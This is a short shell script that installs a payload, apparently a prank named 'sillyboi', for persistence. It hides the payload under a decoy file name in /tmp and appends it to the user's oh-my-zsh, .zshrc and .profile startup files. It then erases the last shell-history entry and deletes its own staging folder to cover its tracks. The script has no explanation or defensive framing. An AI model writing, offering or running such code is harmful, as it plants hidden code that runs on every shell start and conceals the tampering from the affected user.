cp /tmp/sillyboi/sillyboi.sh /tmp/.myserver.sock.lock
if [ -f ~/.oh-my-zsh/oh-my-zsh.sh ]
then
	cat /tmp/.myserver.sock.lock >> ~/.oh-my-zsh/oh-my-zsh.sh
fi
cat /tmp/.myserver.sock.lock >> ~/.zshrc
cat /tmp/.myserver.sock.lock >> ~/.profile
sed '$d' ~/.zsh_history > ~/.zsh_history_TMP && mv ~/.zsh_history_TMP ~/.zsh_history
rm -rf /tmp/sillyboi
